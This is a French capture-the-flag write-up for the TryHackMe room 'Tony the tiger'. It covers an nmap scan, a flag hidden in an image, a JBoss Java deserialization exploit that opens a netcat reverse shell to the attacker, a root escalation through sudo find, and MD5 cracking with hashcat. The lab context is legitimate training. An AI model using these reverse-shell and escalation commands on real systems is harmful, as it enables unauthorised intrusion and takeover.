# Tony the tiger #

## Task 1 Deploy!  ##
Faite un clique sur start machine.   
Puis configurez votre VPN.   

## Task 2 Support Material ##

**What is a great IRL example of an "Object"?**
Dans l'explication d'objet, une lampe est pris pour example pour un objet dans la vie réelle.   
La réponse est : lamp    

**What is the acronym of a possible type of attack resulting from a "serialisation" attack?**
L'attaque DoS est mis comme example d'une sérialisation d'une attaque.   
La réponse est : dos  

**hat lower-level format does data within "Objects" get converted into?**
Ici on parle byte streams, l'état d'un objet en bas level.  
La réponse est : byte streams  

## Task 3 Reconnaissance ##

```bash
im@kali:~/Bureau/tryhackme/write-up$ sudo sh -c "echo '10.10.36.121 tonythetiger.thm' >> /etc/hosts" 
[sudo] Mot de passe de tim : 

tim@kali:~/Bureau/tryhackme/write-up$ sudo nmap -A tonythetiger.thm
Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-23 21:04 CEST
Nmap scan report for tonythetiger.thm (10.10.36.121)
Host is up (0.035s latency).
Not shown: 989 closed ports
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 d6:97:8c:b9:74:d0:f3:9e:fe:f3:a5:ea:f8:a9:b5:7a (DSA)
|   2048 33:a4:7b:91:38:58:50:30:89:2d:e4:57:bb:07:bb:2f (RSA)
|   256 21:01:8b:37:f5:1e:2b:c5:57:f1:b0:42:b7:32:ab:ea (ECDSA)
|_  256 f6:36:07:3c:3b:3d:71:30:c4:cd:2a:13:00:b5:25:ae (ED25519)
80/tcp   open  http        Apache httpd 2.4.7 ((Ubuntu))
|_http-generator: Hugo 0.66.0
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: Tony&#39;s Blog
1090/tcp open  java-rmi    Java RMI
|_rmi-dumpregistry: ERROR: Script execution failed (use -d to debug)
1091/tcp open  java-rmi    Java RMI
1098/tcp open  java-rmi    Java RMI
1099/tcp open  java-object Java Object Serialization
| fingerprint-strings: 
|   NULL: 
|     java.rmi.MarshalledObject|
|     hash[
|     locBytest
|     objBytesq
|     7zur
|     #http://thm-java-deserial.home:8083/q
|     org.jnp.server.NamingServer_Stub
|     java.rmi.server.RemoteStub
|     java.rmi.server.RemoteObject
|     xpwA
|     UnicastRef2
|_    thm-java-deserial.home
4446/tcp open  java-object Java Object Serialization
5500/tcp open  hotline?
| fingerprint-strings: 
|   DNSStatusRequestTCP: 
|     DIGEST-MD5
|     CRAM-MD5
|     NTLM
|     GSSAPI
|     thm-java-deserial
|   DNSVersionBindReqTCP, Help: 
|     CRAM-MD5
|     DIGEST-MD5
|     NTLM
|     GSSAPI
|     thm-java-deserial
|   GenericLines, NULL: 
|     GSSAPI
|     DIGEST-MD5
|     CRAM-MD5
|     NTLM
|     thm-java-deserial
|   GetRequest, HTTPOptions: 
|     CRAM-MD5
|     DIGEST-MD5
|     GSSAPI
|     NTLM
|     thm-java-deserial
|   Kerberos: 
|     NTLM
|     DIGEST-MD5
|     GSSAPI
|     CRAM-MD5
|     thm-java-deserial
|   RPCCheck, TLSSessionReq: 
|     DIGEST-MD5
|     CRAM-MD5
|     GSSAPI
|     NTLM
|     thm-java-deserial
|   RTSPRequest: 
|     GSSAPI
|     DIGEST-MD5
|     NTLM
|     CRAM-MD5
|     thm-java-deserial
|   SSLSessionReq: 
|     NTLM
|     CRAM-MD5
|     GSSAPI
|     DIGEST-MD5
|     thm-java-deserial
|   TerminalServerCookie: 
|     GSSAPI
|     CRAM-MD5
|     NTLM
|     DIGEST-MD5
|_    thm-java-deserial
8009/tcp open  ajp13       Apache Jserv (Protocol v1.3)
| ajp-methods: 
|   Supported methods: GET HEAD POST PUT DELETE TRACE OPTIONS
|   Potentially risky methods: PUT DELETE TRACE
|_  See https://nmap.org/nsedoc/scripts/ajp-methods.html
8080/tcp open  http        Apache Tomcat/Coyote JSP engine 1.1
| http-methods: 
|_  Potentially risky methods: PUT DELETE TRACE
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: Apache-Coyote/1.1
|_http-title: Welcome to JBoss AS
8083/tcp open  http        JBoss service httpd
|_http-title: Site doesn't have a title (text/html).
3 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port1099-TCP:V=7.91%I=7%D=7/23%Time=60FB12D1%P=x86_64-pc-linux-gnu%r(NU
SF:LL,17B,"\xac\xed\0\x05sr\0\x19java\.rmi\.MarshalledObject\|\xbd\x1e\x97
SF:\xedc\xfc>\x02\0\x03I\0\x04hash\[\0\x08locBytest\0\x02\[B\[\0\x08objByt
SF:esq\0~\0\x01xp\xfb\xae7zur\0\x02\[B\xac\xf3\x17\xf8\x06\x08T\xe0\x02\0\
SF:0xp\0\0\x004\xac\xed\0\x05t\0#http://thm-java-deserial\.home:8083/q\0~\
SF:0\0q\0~\0\0uq\0~\0\x03\0\0\0\xcd\xac\xed\0\x05sr\0\x20org\.jnp\.server\
SF:.NamingServer_Stub\0\0\0\0\0\0\0\x02\x02\0\0xr\0\x1ajava\.rmi\.server\.
SF:RemoteStub\xe9\xfe\xdc\xc9\x8b\xe1e\x1a\x02\0\0xr\0\x1cjava\.rmi\.serve
SF:r\.RemoteObject\xd3a\xb4\x91\x0ca3\x1e\x03\0\0xpwA\0\x0bUnicastRef2\0\0
SF:\x16thm-java-deserial\.home\0\0\x04Jd:\xf2\x04\x91\x20s\x80~\x01P\x86\0
SF:\0\x01z\xd4\xb4\x14z\x80\x02\0x");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port4446-TCP:V=7.91%I=7%D=7/23%Time=60FB12D7%P=x86_64-pc-linux-gnu%r(NU
SF:LL,4,"\xac\xed\0\x05");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port5500-TCP:V=7.91%I=7%D=7/23%Time=60FB12D7%P=x86_64-pc-linux-gnu%r(NU
SF:LL,4B,"\0\0\0G\0\0\x01\0\x03\x04\0\0\0\x03\x03\x04\0\0\0\x02\x01\x06GSS
SF:API\x01\nDIGEST-MD5\x01\x08CRAM-MD5\x01\x04NTLM\x02\x11thm-java-deseria
SF:l")%r(GenericLines,4B,"\0\0\0G\0\0\x01\0\x03\x04\0\0\0\x03\x03\x04\0\0\
SF:0\x02\x01\x06GSSAPI\x01\nDIGEST-MD5\x01\x08CRAM-MD5\x01\x04NTLM\x02\x11
SF:thm-java-deserial")%r(GetRequest,4B,"\0\0\0G\0\0\x01\0\x03\x04\0\0\0\x0
SF:3\x03\x04\0\0\0\x02\x01\x08CRAM-MD5\x01\nDIGEST-MD5\x01\x06GSSAPI\x01\x
SF:04NTLM\x02\x11thm-java-deserial")%r(HTTPOptions,4B,"\0\0\0G\0\0\x01\0\x
SF:03\x04\0\0\0\x03\x03\x04\0\0\0\x02\x01\x08CRAM-MD5\x01\nDIGEST-MD5\x01\
SF:x06GSSAPI\x01\x04NTLM\x02\x11thm-java-deserial")%r(RTSPRequest,4B,"\0\0
SF:\0G\0\0\x01\0\x03\x04\0\0\0\x03\x03\x04\0\0\0\x02\x01\x06GSSAPI\x01\nDI
SF:GEST-MD5\x01\x04NTLM\x01\x08CRAM-MD5\x02\x11thm-java-deserial")%r(RPCCh
SF:eck,4B,"\0\0\0G\0\0\x01\0\x03\x04\0\0\0\x03\x03\x04\0\0\0\x02\x01\nDIGE
SF:ST-MD5\x01\x08CRAM-MD5\x01\x06GSSAPI\x01\x04NTLM\x02\x11thm-java-deseri
SF:al")%r(DNSVersionBindReqTCP,4B,"\0\0\0G\0\0\x01\0\x03\x04\0\0\0\x03\x03
SF:\x04\0\0\0\x02\x01\x08CRAM-MD5\x01\nDIGEST-MD5\x01\x04NTLM\x01\x06GSSAP
SF:I\x02\x11thm-java-deserial")%r(DNSStatusRequestTCP,4B,"\0\0\0G\0\0\x01\
SF:0\x03\x04\0\0\0\x03\x03\x04\0\0\0\x02\x01\nDIGEST-MD5\x01\x08CRAM-MD5\x
SF:01\x04NTLM\x01\x06GSSAPI\x02\x11thm-java-deserial")%r(Help,4B,"\0\0\0G\
SF:0\0\x01\0\x03\x04\0\0\0\x03\x03\x04\0\0\0\x02\x01\x08CRAM-MD5\x01\nDIGE
SF:ST-MD5\x01\x04NTLM\x01\x06GSSAPI\x02\x11thm-java-deserial")%r(SSLSessio
SF:nReq,4B,"\0\0\0G\0\0\x01\0\x03\x04\0\0\0\x03\x03\x04\0\0\0\x02\x01\x04N
SF:TLM\x01\x08CRAM-MD5\x01\x06GSSAPI\x01\nDIGEST-MD5\x02\x11thm-java-deser
SF:ial")%r(TerminalServerCookie,4B,"\0\0\0G\0\0\x01\0\x03\x04\0\0\0\x03\x0
SF:3\x04\0\0\0\x02\x01\x06GSSAPI\x01\x08CRAM-MD5\x01\x04NTLM\x01\nDIGEST-M
SF:D5\x02\x11thm-java-deserial")%r(TLSSessionReq,4B,"\0\0\0G\0\0\x01\0\x03
SF:\x04\0\0\0\x03\x03\x04\0\0\0\x02\x01\nDIGEST-MD5\x01\x08CRAM-MD5\x01\x0
SF:6GSSAPI\x01\x04NTLM\x02\x11thm-java-deserial")%r(Kerberos,4B,"\0\0\0G\0
SF:\0\x01\0\x03\x04\0\0\0\x03\x03\x04\0\0\0\x02\x01\x04NTLM\x01\nDIGEST-MD
SF:5\x01\x06GSSAPI\x01\x08CRAM-MD5\x02\x11thm-java-deserial");
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.91%E=4%D=7/23%OT=22%CT=1%CU=31156%PV=Y%DS=2%DC=T%G=Y%TM=60FB12E
OS:E%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=10D%TI=Z%CI=I%II=I%TS=8)OPS
OS:(O1=M506ST11NW6%O2=M506ST11NW6%O3=M506NNT11NW6%O4=M506ST11NW6%O5=M506ST1
OS:1NW6%O6=M506ST11)WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN
OS:(R=Y%DF=Y%T=40%W=6903%O=M506NNSNW6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD
OS:=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 1720/tcp)
HOP RTT      ADDRESS
1   41.54 ms 10.9.0.1
2   41.90 ms tonythetiger.thm (10.10.36.121)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 30.78 seconds
```

**What service is running on port "8080"**
Dans le scan nmap on vois l'information : 8080/tcp open  http        Apache Tomcat/Coyote JSP engine 1.1  
La réponse est : Apache Tomcat/Coyote JSP engine 1.1  

**What is the name of the front-end application running on "8080"?**
Dans le scan nmap on vois l'information : http-title: Welcome to JBoss AS  
La réponse est : JBoss  

## Task 4 Find Tony's Flag! ##

**This flag will have the formatting of "THM{}"**

![page1](./task1-01.png)

```bash
tim@kali:~/Bureau/tryhackme/write-up$ curl -s http://tonythetiger.thm/posts/frosted-flakes/ | grep jpg
  <link rel='icon' type='image/x-icon' href="https://i.imgur.com/ATbbYpN.jpg" />
<p><img src="https://i.imgur.com/be2sOV9.jpg" alt="FrostedFlakes"></p>
    <img alt="Author Avatar" src="https://i.imgur.com/ATbbYpN.jpg" />

tim@kali:~/Bureau/tryhackme/write-up$ wget -nv https://i.imgur.com/ATbbYpN.jpg
2021-07-24 10:50:44 URL:https://i.imgur.com/ATbbYpN.jpg [58063/58063] -> "ATbbYpN.jpg" [1]

tim@kali:~/Bureau/tryhackme/write-up$ strings be2sOV9.jpg | grep -i THM
}THM{Tony_Sure_Loves_Frosted_Flakes}
'THM{Tony_Sure_Loves_Frosted_Flakes}(dQ
```

On va sur la page web principale et clique sur les autres articles.   
On récupère les images.  
Et on regarde les chaîne dans le fichiers images et on trouve le flag.   

Réponse : THM{Tony_Sure_Loves_Frosted_Flakes}  

## Task 5 Exploit! ##
```bash
tim@kali:~/Bureau/tryhackme/write-up$ unzip jboss.zip
Archive:  jboss.zip
   creating: jboss/
  inflating: jboss/credits.txt       
  inflating: jboss/exploit.py        
  inflating: jboss/ysoserial.jar     
```

On décompresse l'exploit.   

![page-jboss](./task5.01.png)

On remarque que jboss fonctionne sur le port 8080, il faut mettre l'adresse ip sinon ca ne fonctione pas.   

```bash
tim@kali:~/Bureau/tryhackme/write-up$ nc -lvnp 1234
listening on [any] 1234 ...
```

On écoute le port 1234.   

```bash
tim@kali:~/Bureau/tryhackme/write-up/jboss$ python exploit.py 10.10.147.18:8080 "nc -e /bin/sh 10.9.228.66 1234"
[*] Target IP: 10.10.147.18
[*] Target PORT: 8080
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
[+] Command executed successfully
```

Sur un autre terminal on exécute l'exploit, avec un reverse shell.   


**I have obtained a shell.**

```bash
lvnp: forward host lookup failed: Unknown host
tim@kali:~/Bureau/tryhackme/write-up$ nc -lvnp 1234
listening on [any] 1234 ...
connect to [10.9.228.66] from (UNKNOWN) [10.10.147.18] 42108
whoami
cmnatic
```

On obtient un shell.   

##  Task 6 Find User JBoss' flag! ##
```bash
python -c 'import pty;pty.spawn("/bin/bash")'


cmnatic@thm-java-deserial:/$ cd home
cd home
cmnatic@thm-java-deserial:/home$ ls
ls
cmnatic  jboss  tony
cmnatic@thm-java-deserial:/home$ 

cmnatic@thm-java-deserial:/home$ cd jboss
cd jboss
cmnatic@thm-java-deserial:/home/jboss$ ls
ls -al

ls -al
total 36
drwxr-xr-x 3 jboss   jboss   4096 Mar  7  2020 .
drwxr-xr-x 5 root    root    4096 Mar  6  2020 ..
-rwxrwxrwx 1 jboss   jboss    206 Jul 26 08:32 .bash_history
-rw-r--r-- 1 jboss   jboss    220 Mar  6  2020 .bash_logout
-rw-r--r-- 1 jboss   jboss   3637 Mar  6  2020 .bashrc
drwx------ 2 jboss   jboss   4096 Mar  7  2020 .cache
-rw-rw-r-- 1 cmnatic cmnatic   38 Mar  6  2020 .jboss.txt
-rw-r--r-- 1 jboss   jboss    675 Mar  6  2020 .profile
-rw-r--r-- 1 cmnatic cmnatic  368 Mar  6  2020 note
cmnatic@thm-java-deserial:/home/jboss$ cat .jboss.txt
cat .jboss.txt
THM{50c10ad46b5793704601ecdad865eb06}
```
**
**This flag has the formatting of "THM{}"**


On stabilise le shell.   
Puis on lit le fichier .jboss.txt.
On trouve le flag.  
Le flag est : THM{50c10ad46b5793704601ecdad865eb06}  

##  Task 6 Find User JBoss' flag! ##

```bash
cmnatic@thm-java-deserial:/home/jboss$ cat note
cat note
Hey JBoss!

Following your email, I have tried to replicate the issues you were having with the system.

However, I don't know what commands you executed - is there any file where this history is stored that I can access?

Oh! I almost forgot... I have reset your password as requested (make sure not to tell it to anyone!)

Password: likeaboss

Kind Regards,
CMNatic
```

Dans le fichier note on a un mot de passe.  
Mot de passe est : likeaboss  

```bash
cmnatic@thm-java-deserial:/home/jboss$ su jboss
su jboss
Password: likeaboss

jboss@thm-java-deserial:~$ sudo -l
sudo -l
Matching Defaults entries for jboss on thm-java-deserial:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jboss may run the following commands on thm-java-deserial:
    (ALL) NOPASSWD: /usr/bin/find
```

On se connect en tant que jboss.  
On regarde que sudo n'a pas besoin de mot de passe pour la commande find.  

Sur [gtfobin](https://gtfobins.github.io/gtfobins/find/), il explique comment avoir un shell root avec la commande find.  

```bash
jboss@thm-java-deserial:~$ sudo find . -exec /bin/sh \; -quit
sudo find . -exec /bin/sh \; -quit

cat /root/root.txt
QkM3N0FDMDcyRUUzMEUzNzYwODA2ODY0RTIzNEM3Q0Y==
```

On a un flag mais il est encodé en base64.   

```bash
tim@kali:~/Bureau/tryhackme/write-up/jboss$ echo 'QkM3N0FDMDcyRUUzMEUzNzYwODA2ODY0RTIzNEM3Q0Y==' | base64 -d
BC77AC072EE30E3760806864E234C7CFbase64: entrée incorrecte

im@kali:~/Bureau/tryhackme/write-up/jboss$ hash-identifier BC77AC072EE30E3760806864E234C7CF  | head -20
   #########################################################################
   #     __  __                     __           ______    _____           #
   #    /\ \/\ \                   /\ \         /\__  _\  /\  _ `\         #
   #    \ \ \_\ \     __      ____ \ \ \___     \/_/\ \/  \ \ \/\ \        #
   #     \ \  _  \  /'__`\   / ,__\ \ \  _ `\      \ \ \   \ \ \ \ \       #
   #      \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \      \_\ \__ \ \ \_\ \      #
   #       \ \_\ \_\ \___ \_\/\____/  \ \_\ \_\     /\_____\ \ \____/      #
   #        \/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.2 #
   #                                                             By Zion3R #
   #                                                    www.Blackploit.com #
   #                                                   Root@Blackploit.com #
   #########################################################################
--------------------------------------------------

Possible Hashs:
[+] MD5
[+] Domain Cached Credentials - MD4(MD4(($pass)).(strtolower($username)))

Least Possible Hashs:
[+] RAdmin v2.x

tim@kali:~/Bureau/tryhackme/write-up/jboss$ echo "BC77AC072EE30E3760806864E234C7CF" > hash.txt

tim@kali:~/Bureau/tryhackme/write-up/jboss$ hashcat -a 0 -m 0 hash.txt /usr/share/wordlists/rockyou.txt --quiet
bc77ac072ee30e3760806864e234c7cf:zxcvbnm123456789
```

On décode la chaîne on trouve un hash.  
On identifie le hash, c'est du md5.   
On le crack avec hashcat est on trouve le flag.   
```

Réponse : zxcvbnm123456789   
